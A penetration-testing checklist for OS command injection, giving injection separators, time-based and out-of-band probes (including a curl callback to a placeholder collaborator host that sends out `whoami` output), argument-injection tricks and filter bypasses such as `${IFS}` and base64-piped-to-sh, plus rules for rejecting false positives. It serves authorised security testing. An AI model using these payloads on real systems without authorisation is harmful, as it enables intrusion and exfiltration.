# OS Command Injection (cmdi)

User input reaching a system shell. Prove execution with command output, an
out-of-band callback, or a dose-dependent delay — never a lone error string.

## Checklist
- Identify sinks that shell out: ping/traceroute/nslookup tools, file converters, image/PDF processors (ImageMagick/Ghostscript), backup/export, git/ssh wrappers, and any field passed to a system call.
- Separator probe in the parameter: `; id`, `| id`, `|| id`, `&& id`, backtick `id` backtick, `$(id)`, newline `%0a id`, and `%0d%0a`.
- In-band confirmation: look for command output (`uid=`, `root:x:` from `cat /etc/passwd`) merged into the response.
- Blind time-based: `; sleep 5`, `| sleep 5`, `$(sleep 5)`, Windows `& ping -n 6 127.0.0.1`; confirm the delay is dose-dependent and reproducible.
- Blind out-of-band: `; curl http://COLLAB/$(whoami)`, `nslookup $(whoami).COLLAB`, or DNS exfil of command output into a subdomain.
- Argument injection (no separators needed): sneak extra flags into a wrapped tool, e.g. a filename `--output=/path`, git `--upload-pack`, or ImageMagick `-write`.
- Windows vs Unix: try both (`&`, `&&`, `|` on both; `;` Unix; `%0a` stack-dependent) and both command sets (`id`/`whoami`, `type`/`cat`).
- Quote/space breakout: close an existing quote (`'`/`"`) around your input, and use `${IFS}`/`$IFS$9`/`<>` when spaces are filtered.
- Second-order: payload stored in one field (hostname, filename) executed later by a cron/worker — test the consumer and use OOB to catch delayed execution.
- Context-specific sinks: `eval`/`exec`/`system`/`popen`/`child_process.exec`/backticks in the language, and template/expression sinks that reach a shell.
- Confirm and bound impact with a benign command (`id`, `hostname`), capture evidence, auto-clean any file created, and never run destructive or lateral-movement commands.

## Bypasses
- Space filters: `${IFS}`, `$IFS$9`, `{cat,/etc/passwd}`, `<`/`<>` redirection, tab `%09`.
- Keyword/path filters: quote insertion (`c""at`, `c'a't`), glob (`/bin/c?t`), `$(rev<<<'di')`, base64 `echo ... | base64 -d | sh`.
- Separator variety and encoding: `%0a`, `%0d`, URL/double-URL, backticks vs `$()`, nested `$()`.
- Argument/flag injection where no shell metacharacter is allowed but the value becomes an extra CLI argument.
- Force DNS/HTTP OOB in blind environments where stdout is not returned.
- Wildcards and brace expansion to assemble commands from allowed characters.

## Kill rules
- A reflected error mentioning a command with no evidence it ran (no output, no OOB, no dose-dependent delay).
- The delay is constant regardless of the `sleep` value, or not reproducible — jitter, not injection.
- Special characters are accepted but the value is passed as a single safe argument (no shell) — argument handling, not command execution.
- The injection runs only in a client-side sandbox or a documented local CLI, not on the server.
- The output you see is attacker-supplied echo, not actual command output.
- Host/tool is out of scope, or execution requires roles you were legitimately given.
